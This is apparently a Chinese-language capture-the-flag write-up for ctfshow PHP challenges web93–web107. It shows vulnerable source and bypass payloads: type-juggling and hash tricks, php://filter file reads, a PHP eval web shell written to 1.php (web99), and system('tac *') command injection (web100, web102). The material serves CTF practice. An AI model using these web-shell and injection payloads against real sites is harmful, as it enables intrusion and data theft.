<p>第一个if好绕过，只要不是4476就可以；第二个if，有一个intval()函数，而且任何类型的都可以，那我们，八进制，十六进制都可以</p>
<p>?num=010574</p>
<p>?num=0x117c</p>
<h1>web93</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里又过滤了字母，那我们的十六进制就不可以了，可以试试八进制</p>
<p>?num=010574</p>
<p>ctfshow{ad65cdd0-636d-4c10-9561-adac08ad24db}</p>
<h1>web94</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于strpos()函数，可以用%0a、小数点、还可以用八进制绕过日(前面加一个%20，达成拼接)</p>
<p>strpos()函数，它要求num中必须有0，但还不能在开头</p>
<p>?num=%0a4476</p>
<p>?num=4476.0</p>
<p>由于第三个if必须要我们在num里面插进去一个0才可以，我们可以把4476换成八进制010574，或者把4476变成小数类型的，</p>
<p>?num=%0a010574</p>
<p>?num=%0a4476.0</p>
<p>?num=%0a010574+01</p>
<p>ctfshow{ac84a184-911a-497e-987e-9ac8af505bd2}</p>
<h1>web95</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接用八进制，然后用空格或者换行符</p>
<p>?num=%20010574</p>
<p>?num=%0a010574+1</p>
<p>?num=+010574</p>
<p>?num=%2b010574    %2b是+</p>
<p>太巧了4476/8=520</p>
<p>intval常见输出</p>
<p><img src="image-20250124022043836.png" alt="image-20250124022043836"></p>
<p>ctfshow{8719f1fd-f070-4353-8e9a-a33948b0d9de}</p>
<h1>web96</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>?u=php://filter/convert.base64-encode/resource=flag.php</p>
<p>这里的新方法:?u=./flag.php</p>
<p>ctfshow{39dcec3b-7245-4618-be73-b8b96130ab94}</p>
<h1>web97</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>md5无法处理数组。好像强弱比较都可以用数组绕过</p>
<p>好像还有md5碰撞<a href="https://blog.csdn.net/qq_49480008/article/details/113753951">https://blog.csdn.net/qq_49480008/article/details/113753951</a></p>
<p>ctfshow{97595aeb-9a38-4a87-ada7-8bcc9a31859e}</p>
<h1>web98</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>?同java当中的?的用法相同：如果满足条件则返回true的结果，否则返回flase的结果</p>
<p>倒着分析：</p>
<p>1.这里我们要拿到最后的$flag：我们要get一个HTTP_FLAG，而且HTTP_FLAG还要等于flag</p>
<p>2.如果我们get的flag等于flag，那么get变为$_SERVER</p>
<p>3.如果我们get的flag等于flag，那么get变为$_COOKIE</p>
<p>4.get是否有参数，如果有，则把post的值给get。也就是说a=b;b=1;。源码当中的&amp;就是引用post的</p>
<p>这里的234条件只要2条件，因为34条件对我们拿flag没有用。</p>
<p>get参数可以为任何字母、数字，但不能没有</p>
<p>?*</p>
<p>post=HTTP_FLAG=flag</p>
<p>ctfshow{e8fc547b-9f20-4fc8-88aa-e463e93ee0aa}</p>
<h1>web99</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>in_arry()与intval() 一样，1123aaaa=1123(in_array延用了php中的==)</p>
<p>?n=1.php</p>
<p>post=content=<?php @eval($_POST[a]); ?></p>
<p>antsword连接(百度解决antsword的问题)，或者正常方法搞</p>
<p>ctfshow{836ba253-49ea-4e93-852a-1df05664ac15}</p>
<h1>web100</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>逻辑运算符的优先级：“&amp;&amp;” &gt; “||” &gt; “=” &gt; “and”，等号的优先级高于and，所以v0只跟v1有关系，v2和v3是干扰。所以$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);这一段只会执行$v0=is_numeric($v1)，后边的就没有用了</p>
<p>?v1=1&amp;v2=var_dump($ctfshow)&amp;v3=;</p>
<p>或者</p>
<p>?v1=1&amp;v2=@eval($_POST[zmr])?&gt;/<em>&amp;v3=</em>/;</p>
<p>zmr=system(‘tac f*’);</p>
<p>好像存在过滤，…咋过滤的啊，不知道。直接tac *</p>
<p>zmr=system(‘tac *’);</p>
<p>flag_is_7a396b080x2d9bbf0x2d49bb0x2d95960x2d337c22cf6fde</p>
<p>flag_is_7a396b080x2d9bbf0x2d49bb0x2d95960x2d337c22cf6fde</p>
<p>0x2d是-</p>
<p>ctfshow{7a396b08-9bbf-49bb-9596-337c22cf6fde}</p>
<h1>web101</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>反射，通俗来讲就是可以通过一个对象来获取所属类的具体内容，php中内置了强大的反射API：</p>
<ul>
<li>ReflectionClass：一个反射类，功能十分强大，内置了各种获取类信息的方法，创建方式为new ReflectionClass(str 类名)，可以用echo new ReflectionClass(‘className’)打印类的信息。</li>
<li>ReflectionObject：另一个反射类，创建方式为new ReflectionObject(对象名)。</li>
</ul>
<p>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</p>
<p>flag_15b848760x2d91540x2d45430x2db2770x2dc72dcd68eb6</p>
<h1>web102</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题卢本伟有话说：**</p>
<p>hex2bin，php当中的函数，对什么什么使用hex解码</p>
<p>call_user_func($v1,$s)的意思是调用$v1这个函数解析$s这个值</p>
<p>substr($v2,2)的意思是从v2的第三个字符开始读取，那v2如果是命令的话，前面得加俩字母或者其他东西</p>
<p>先理解一下if外面的函数</p>
<p>总之是要拼接file_put_contents($v3,$str);</p>
<p>​		那么v3=1.php。str=system(tac *);</p>
<p>​	再看v3，没有啥限制。</p>
<p>​	再看str，$str = call_user_func($v1,$s);</p>
<p>​		v1=system，$s=tac *</p>
<p>​	再看substr($v2,2)，</p>
<p>​		v2=aatac *</p>
<p>​	再看v4，必须是数字才可以进入if函数，但是上面我们的v2=是字母，而不是数字，那么我们要弄成数字，怎么弄？变成八进制？但是八进制的话需要两步才可以拿到字符串，变成十六进制？好像可以，但是十六进制里面有字母啊，没关系，有时候十六进制也都会是数字(这里可以含有字母e)，找一找(这里就是卢本伟吐槽的地方了)</p>
<p>​	这里我们:v1=hex2bin，v2(经过base64和hex加密)=115044383959474e6864434171594473，然后v3=php://filter/write=convert.base64-decode/resource=1.php，就完美解决所以问题了。</p>
<p>不得不说，前人的智慧啊，流弊。</p>
<p>?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</p>
<p>post=v1=hex2bin</p>
<p>ctfshow{f71c0477-b08e-46ff-aa38-15033961057e}</p>
<h1>web103</h1>
<p>道理同web101</p>
<h1>web104</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题比较简单，不分析了</p>
<p>?v2=2</p>
<p>post=v1=2</p>
<p>ctfshow{ac04649d-e36e-40eb-b6ca-473940be8d59}</p>
<h1>web105</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出：你还想要flag嘛？</span></span><br></pre></td></tr></table></figure>
<p>$$为覆盖</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">	<span class="variable">$$a</span> = <span class="string">&#x27;world&#x27;</span>  <span class="comment">#相当于$($a) = &#x27;world&#x27;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$hello</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#输出:world</span></span><br></pre></td></tr></table></figure>
<p>$suces	$error	$flag</p>
<p>这道题最后一行有一个回显内容是$error的内容/不论post的内容为什么，都会输出$error(输入flag=flag又会进入一种循环)</p>
<p>我们可以利用源码当中的$$替换$flag到的die($error)</p>
<p>$$key=$$value</p>
<p>$suces=$flag</p>
<p>$$key=$$value</p>
<p>$error=$suces</p>
<p>?a=flag</p>
<p>post=error=a</p>
<p>ctfshow{09b3bd0b-d190-46a3-a74d-34cbd51027e3}</p>
<h1>web106</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sha1弱比较<br>
aaroZmOk<br>
aaK1STfY<br>
aaO8zKZF<br>
aa3OFF9m</p>
<p>经过sha1单向加密后的结果正好是零的科学计数法的形式</p>
<p>那这样正好绕过sha1函数和!=</p>
<p>ctfshow{50a2ad6f-2084-4155-b7f0-1ef62e03c8f8}</p>
<h1>web107</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>parse_str(string,arry)的意思是把格式为xxx=123的东西以数组的形式存进arry，当echo arry[‘xxx’]时的结果是123</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;q=123&amp;p=456&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>[<span class="string">&#x27;q&#x27;</span>];   <span class="comment">//输出123</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>[<span class="string">&#x27;p&#x27;</span>];   <span class="comment">//输出456</span></span><br></pre></td></tr></table></figure>
<p>?v3=1</p>
<p>post:v1=flag=c4ca4238a0b923820dcc509a6f75849b</p>
<p>ctfshow{f3f4f0a2-04b1-4e1a-a848-17f9f5a7325c}</p>
<h1>web108</h1>
